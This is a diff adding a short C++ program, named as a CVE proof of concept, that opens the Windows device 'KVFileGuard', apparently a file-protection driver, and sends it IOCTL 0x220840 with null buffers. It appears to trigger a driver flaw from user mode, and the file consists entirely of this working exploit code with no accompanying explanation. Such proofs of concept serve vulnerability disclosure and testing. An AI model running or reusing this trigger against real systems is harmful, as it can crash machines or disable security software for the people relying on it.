@@ -1,0 +1,20 @@
+// CVEPOC.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include <Windows.h>
+
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	DWORD nbBytes;
+	HANDLE hDevice;
+
+	hDevice = CreateFile("\\\\.\\KVFileGuard", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+	if (hDevice != INVALID_HANDLE_VALUE)
+	{
+		DeviceIoControl(hDevice, 0x220840, (LPVOID)0, 0, (LPVOID)0, 0, &nbBytes, NULL);
+	}
+	return 0;
+}
+
